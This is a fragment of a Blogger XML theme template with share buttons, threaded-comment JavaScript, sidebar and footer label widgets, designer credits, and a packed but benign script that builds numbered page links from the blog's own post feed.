  <b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showOrkutButton'><a class='goog-inline-block share-button sb-orkut' expr:href='data:post.sharePostUrl + &quot;&amp;target=orkut&quot;' expr:title='data:top.shareToOrkutMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToOrkutMsg/></span></a></b:if><b:if cond='data:top.showPinterestButton'><a class='goog-inline-block share-button sb-pinterest' expr:href='data:post.sharePostUrl + &quot;&amp;target=pinterest&quot;' expr:title='data:top.shareToPinterestMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToPinterestMsg/></span></a></b:if><b:if cond='data:top.showDummy'><div class='goog-inline-block dummy-container'><data:post.dummyTag/></div></b:if>
</b:includable>
     <b:includable id='status-message'>
  <b:if cond='data:navMessage'>
  <div class='status-msg-wrap'>
    <div class='status-msg-body'>
      <data:navMessage/>
    </div>
    <div class='status-msg-border'>
      <div class='status-msg-bg'>
        <div class='status-msg-hidden'><data:navMessage/></div>
      </div>
    </div>
  </div>
  <div style='clear: both;'/>
  </b:if>
</b:includable>
     <b:includable id='threaded-comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.friendConnectJs/>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
    </script>
  </div>
</b:includable>
     <b:includable id='threaded_comment_css'>
  <style>

  </style>
</b:includable>
     <b:includable id='threaded_comment_js' var='post'>
  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>

  <script type='text/javascript'>
    (function() {
      var items = <data:post.commentJso/>;
      var msgs = <data:post.commentMsgs/>;
      var config = <data:post.commentConfig/>;

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
</b:includable>
     <b:includable id='threaded_comments' var='post'>
  <div class='comments' id='comments'>
    <h4><data:post.commentLabelFull/>: <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>Leave Your Comments</a></h4>

    <div class='comments-content'>
      <b:if cond='data:post.embedCommentForm'>
        <b:include data='post' name='threaded_comment_js'/>
      </b:if>
      <div id='comment-holder'>
         <data:post.commentHtml/>
      </div>
    </div>

    <p class='comment-footer'>
      <b:if cond='data:post.allowNewComments'>
        <b:include data='post' name='threaded-comment-form'/>
      <b:else/>
        <data:post.noNewCommentsText/>
      </b:if>
    </p>

    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:if cond='data:post.showBacklinks'>
         <b:include data='post' name='backlinks'/>
       </b:if>
    </div>
    </div>
  </div>
</b:includable>
   </b:widget>
 </b:section>
 </div><!-- /main-wrapper -->

<div class='sidebar-wrapper'>
<b:section class='sidebar' id='sidebar' showaddedelements='yes'>
  <b:widget id='HTML1' locked='false' title='Search Box' type='HTML'>
    <b:includable id='main'>
<form action='/search' id='searchform' method='get' role='search'>
  <input class='field' id='s' name='s' placeholder='Enter search term and hit enter' type='text' value=''/>
</form>
</b:includable>
  </b:widget>
  <b:widget id='PopularPosts1' locked='false' title='Popular Posts' type='PopularPosts'>
    <b:includable id='main'>
  <b:if cond='data:title'><h2><data:title/></h2></b:if>
  <div class='widget-content popular-posts'>
    <ul>
      <b:loop values='data:posts' var='post'>
      <li>
        <b:if cond='data:showThumbnails == &quot;false&quot;'>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (1) No snippet/thumbnail -->
            <a expr:href='data:post.href'><data:post.title/></a>
          <b:else/>
            <!-- (2) Show only snippets -->
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <div class='item-snippet'><data:post.snippet/></div>
          </b:if>
        <b:else/>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (3) Show only thumbnails -->
            <div class='item-thumbnail-only'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            </div>
            <div style='clear: both;'/>
          <b:else/>
            <!-- (4) Show snippets and thumbnails -->
            <div class='item-content'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img alt='' border='0' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
              <div class='item-snippet'><data:post.snippet/></div>
            </div>
            <div style='clear: both;'/>
          </b:if>
        </b:if>
      </li>
      </b:loop>
    </ul>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
  <b:widget id='Label6' locked='false' title='Channels' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
  <b:widget id='Poll1' locked='false' title='How&amp;#39;s The Design Of Enpine Blog?' type='Poll'>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>

 <div class='widget-content' id='widget-content'>
   <iframe allowtransparency='true' expr:height='data:iframeheight' expr:name='&quot;poll-widget&quot; + data:pollid' expr:src='data:iframeurl' frameborder='0' style='border:none; width:100%;'/>
   <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
</b:section>                        
</div>
 
<div class='clr'/>
            </div><!-- /outer-wrapper -->
</div>          
</div>
</div>
  <div class='clr'/>

<div class='toggle'>
  <a class='toggle-button' href='#footer'>+</a></div>
<div id='footer'>
    <div class='ct-wrapper'>
<b:section class='footer radius5' id='footer1' preferred='yes'>
  <b:widget id='Label5' locked='false' title='Channels' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
</b:section>

<b:section class='footer radius5' id='footer2' preferred='yes'>
  <b:widget id='Label3' locked='false' title='Channels' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
</b:section>

<b:section class='footer radius5' id='footer3' preferred='yes'>
  <b:widget id='Label2' locked='false' title='Trend Tags' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
</b:section>

<b:section class='footer radius5' id='footer4' preferred='yes'>
  <b:widget id='Label1' locked='false' title='Hot Tags' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
</b:section>

<b:section class='footer radius5' id='footer5' preferred='yes'>
  <b:widget id='Label4' locked='false' title='Channels' type='Label'>
    <b:includable id='main'>
  <b:if cond='data:title'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
      <b:loop values='data:labels' var='label'>
        <li>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </li>
      </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
</b:section>

    <div class='clr'/>

            </div><!-- /ct-wrapper -->
</div><!-- footer -->

  <div class='footer-credits'>
    <div class='ct-wrapper'>
     <div class='footer-menu'>
  <ul>
    <li><a href='#'>Homepage</a></li>
    <li><a href='#'>About Us</a></li>
    <li><a href='#'>Conact Us</a></li>
    <li><a href='#'>Archives</a></li>
    <li><a href='#'>Privacy Policy</a></li>
    <li><a href='#'>Terms &amp; Condition</a></li>
  </ul>
  </div>
      <div class='clr'/>
 <p style='text-align:center'>Copyright 2013 <a expr:href='data:blog.homepageUrl'><data:blog.title/></a></p>
       <p class='copyright' style='text-align:center'>Designed by <a href='http://www.templatetrackers.com'>Template Trackers</a> </p>
<p style='text-align:center'> Published..<a href='http://gooyaabitemplates.com/' title='Blogger Templates'>Gooyaabi Templates</a> </p>
<!-- Do Not Temper This -->
      
    </div><!-- /ct-wrapper -->
  </div><!-- footer-credits -->
<b:include data='blog' name='google-analytics'/>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<script type='text/javascript'>
var pageCount=10;
var displayPageNum=10;
var upPageWord =&#39;Previous&#39;;
var downPageWord =&#39;Next&#39;;
</script>
<script type='text/javascript'>
/*<![CDATA[*/
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('W 1b(D){3 8=H;3 c=U 13();3 7=1;3 9=1;3 r=0;3 A=0;3 w=0;3 5=\'\';3 m=\'\';3 v=\'\';y(3 i=0,h;h=D.10.11[i];i++){3 O=h.L.$t.B(0,19)+h.L.$t.B(Z,V);C=X(O);3 s=h.s.$t;4(s!=\'\'){4(r==0||(r%u==(u-1))){4(8.d(C)!=-1){7=9}4(s!=\'\')9++;c[c.l]=\'/j?J-g=\'+C+\'&g-G=\'+u}}r++}y(3 p=0;p<c.l;p++){4(p>=(7-M-1)&&p<(7+M)){4(A==0&&p==7-2){4(7==2){m=\'<6 b="F"><a f="/">\'+I+\'</a></6>\'}k{m=\'<6 b="F"><a f="\'+c[p]+\'">\'+I+\'</a></6>\'}A++}4(p==(7-1)){5+=\'<6 b="15">\'+7+\'</6>\'}k{4(p==0){5+=\'<6 b="P"><a f="/">1</a></6>\'}k{5+=\'<6 b="P"><a f="\'+c[p]+\'">\'+(p+1)+\'</a></6>\'}}4(w==0&&p==7){v=\'<6 b="F"> <a f="\'+c[p]+\'">\'+Y+\'</a></6>\';w++}}}4(7>1){5=\'\'+m+\' \'+5+\' \'}5=\'<K b="17"><6 1n="1j: #1k;" b="1q"> 1l (\'+(9-1)+\')</6>\'+5;4(7<(9-1)){5+=v}4(9==1)9++;5+=\'</K>\';3 e=E.1m("e");3 z=E.1o("16-1i");4(9<=2){5=\'\'}y(3 p=0;p<e.l;p++){e[p].N=5}4(e&&e.l>0){5=\'\'}4(z){z.N=5}}W 1g(D){3 8=H;3 c=U 13();3 Q=8.d("/j/o/")!=-1;3 n=Q?8.12(8.d("/j/o/")+14,8.l):"";n=n.d("?")!=-1?n.12(0,n.d("?")):n;3 7=1;3 9=1;3 r=0;3 A=0;3 w=0;3 5=\'\';3 m=\'\';3 v=\'\';3 R=\'<6 b="P"><a f="/j/o/\'+n+\'?&g-G=\'+u+\'">\';3 8=H;y(3 i=0,h;h=D.10.11[i];i++){3 O=h.L.$t.B(0,19)+h.L.$t.B(Z,V);C=X(O);3 s=h.s.$t;4(s!=\'\'){4(r==0||(r%u==(u-1))){4(8.d(C)!=-1){7=9}4(s!=\'\')9++;c[c.l]=\'/j/o/\'+n+\'?J-g=\'+C+\'&g-G=\'+u}}r++}y(3 p=0;p<c.l;p++){4(p>=(7-M-1)&&p<(7+M)){4(A==0&&p==7-2){4(7==2){m=R+I+\'</a></6>\'}k{m=\'<6 b="F"><a f="\'+c[p]+\'">\'+I+\'</a></6>\'}A++}4(p==(7-1)){5+=\'<6 b="15">\'+7+\'</6>\'}k{4(p==0){5=R+\'1</a></6>\'}k{5+=\'<6 b="P"><a f="\'+c[p]+\'">\'+(p+1)+\'</a></6>\'}}4(w==0&&p==7){v=\'<6 b="F"> <a f="\'+c[p]+\'">\'+Y+\'</a></6>\';w++}}}4(7>1){4(!Q){5=\'\'+m+\' \'+5+\' \'}k{5=\'\'+m+\' \'+5+\' \'}}5=\'<K b="17"><6 1n="1j: #1k;" b="1q"> 1l (\'+(9-1)+\')</6>\'+5;4(7<(9-1)){5+=v}4(9==1)9++;5+=\'</K>\';3 e=E.1m("e");3 z=E.1o("16-1i");4(9<=2){5=\'\'}y(3 p=0;p<e.l;p++){e[p].N=5}4(e&&e.l>0){5=\'\'}4(z){z.N=5}}3 H=1s.f;3 8=H;4(8.d("/j/o/")!=-1){4(8.d("?J-g")!=-1){3 S=8.B(8.d("/j/o/")+14,8.d("?J-g"))}k{3 S=8.B(8.d("/j/o/")+14,8.d("?&g"))}}3 T="/";4(8.d("?q=")==-1){4(8.d("/j/o/")==-1){E.1c(\'<x 1f="\'+T+\'1e/1d/1t?18=D-1a-x&1h=1b&g-G=1p" ><\\/x>\')}k{E.1c(\'<x 1f="\'+T+\'1e/1d/1r/-/\'+S+\'?18=D-1a-x&1h=1g&g-G=1p" ><\\/x>\')}}',62,92,'|||var|if|html|span|thisNum|thisUrl|postNum||class|htmlMap|indexOf|pageArea|href|max|post||search|else|length|upPageHtml|thisLable|label|||itemCount|title||pageCount|downPageHtml|eFlag|script|for|blogPager|fFlag|substring|timestamp|json|document|showpage|results|home_page_url|upPageWord|updated|div|published|displayPageNum|innerHTML|timestamp1|showpageNum|isLablePage|labelHtml|lblname1|home_page|new|29|function|encodeURIComponent|downPageWord|23|feed|entry|substr|Array||showpagePoint|blog|showpageArea|alt||in|showpageCount|write|posts|feeds|src|showpageCount2|callback|pager|COLOR|000|Pages|getElementsByName|style|getElementById|99999|showpageOf|full|location|summary'.split('|'),0,{}))

/*]]>*/
  </script>
  </b:if>
</body>
</html>